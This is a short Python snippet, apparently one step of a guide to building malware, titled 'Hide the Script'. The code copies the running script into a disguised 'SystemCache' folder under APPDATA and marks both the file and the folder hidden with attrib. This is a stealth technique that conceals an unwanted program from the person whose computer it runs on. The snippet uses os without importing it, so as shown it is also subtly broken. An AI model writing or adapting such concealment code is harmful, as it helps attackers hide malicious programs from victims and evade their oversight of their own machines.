# Hide the Script
# Move the script to a hidden directory and set it as a hidden file:

import shutil

def hide_script():
    hidden_dir = os.path.join(os.getenv('APPDATA'), 'SystemCache')
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    script_path = os.path.abspath(__file__)
    hidden_path = os.path.join(hidden_dir, os.path.basename(script_path))
    if script_path != hidden_path:
        shutil.copy2(script_path, hidden_path)
        os.system(f'attrib +h {hidden_path}')
        os.system(f'attrib +h {hidden_dir}')

    return hidden_path

script_path = hide_script()
